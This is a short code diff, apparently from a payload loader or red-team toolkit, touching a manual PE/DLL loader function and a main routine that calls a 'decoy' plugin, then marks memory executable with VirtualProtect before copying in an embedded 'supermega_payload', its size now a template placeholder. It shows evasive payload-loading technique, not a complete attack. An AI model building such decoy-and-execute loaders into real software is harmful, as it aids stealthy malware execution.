@@ -42,9 +42,6 @@ void mymemcpy(void* dest, const void* src, size_t n) {
 
 
 DWORD_PTR load_dll(LPVOID dllBase, DWORD_PTR *ret_dllBase, DWORD *ret_aoep) {
-	// get this module's image base address
-	//PVOID imageBase = GetModuleHandleA(NULL);
-
 	// dllBase is expected to be page-aligned
 	if ((DWORD_PTR)dllBase & 0xFFF)
 	{
@@ -55,7 +52,6 @@ DWORD_PTR load_dll(LPVOID dllBase, DWORD_PTR *ret_dllBase, DWORD *ret_aoep) {
 	PIMAGE_DOS_HEADER dosHeaders = (PIMAGE_DOS_HEADER)dllBase;
 	PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)dllBase + dosHeaders->e_lfanew);
 	SIZE_T dllImageSize = ntHeaders->OptionalHeader.SizeOfImage;
-
 	DWORD_PTR deltaImageBase = (DWORD_PTR)dllBase - (DWORD_PTR)ntHeaders->OptionalHeader.ImageBase;
 
 /*
@@ -204,7 +200,7 @@ int main()
 	// Call: Decoy plugin
 	decoy();
 
-	VirtualProtect((LPVOID)dest, 0x7000, PAGE_EXECUTE_READWRITE, &oldProtect);
+	VirtualProtect((LPVOID)dest, {{PAYLOAD_LEN}}, PAGE_EXECUTE_READWRITE, &oldProtect);
 
 	// FROM supermega_payload[] 
 	// TO dest[]
